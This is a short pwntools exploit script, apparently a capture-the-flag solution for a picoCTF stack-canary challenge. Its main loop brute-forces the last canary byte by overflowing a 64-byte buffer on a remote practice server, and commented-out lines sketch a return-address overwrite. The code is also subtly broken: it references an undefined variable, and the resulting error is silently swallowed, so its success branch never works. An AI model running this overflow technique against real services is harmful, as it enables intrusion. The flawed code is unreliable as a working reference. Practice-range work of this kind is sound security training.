from pwn import *
import binascii
import itertools
import string
import sys

# context.log_level = 'debug'
REMOTE = True
CANARY_OFFSET = 64

# overflow by 1 character and try out all possible combinations for that

def send(canary_value):
    payload = b'A' * CANARY_OFFSET
    payload += canary_value.encode()
    # payload += pack(canary_value_int, 32, endianness='big')
    # payload += b'A'*16
    # payload += pack(0x08049336, 32, endianness='little')

    if REMOTE:
        r = remote('saturn.picoctf.net', 58172)

        c1 = r.recvuntil('>')
        r.sendline("300")
        c2 = r.recvuntil('>')
        # breakpoint()
        
        r.send(payload)
        
        content = r.recvall()
        print(content)
        if 'Corrupt' in content.decode():
            raise Exception(f"Nope for {canary_value}")
        else:
            print(f"found! {canary_value}")
            return canary_value
            # breakpoint()

    else:
        f = open('payload', 'wb')
        f.write(payload)
        f.close()

for i in itertools.product(string.printable, repeat = 1):
    canary_test = ''.join(i)
    try:
        letter = send('BiR' + canary_test) # iteratively find letters of the canary
        print(f"FOUND ONE LETTER! {string.printable[idx]}")
        sys.exit(0)
    except Exception:
        continue

send('BiRd')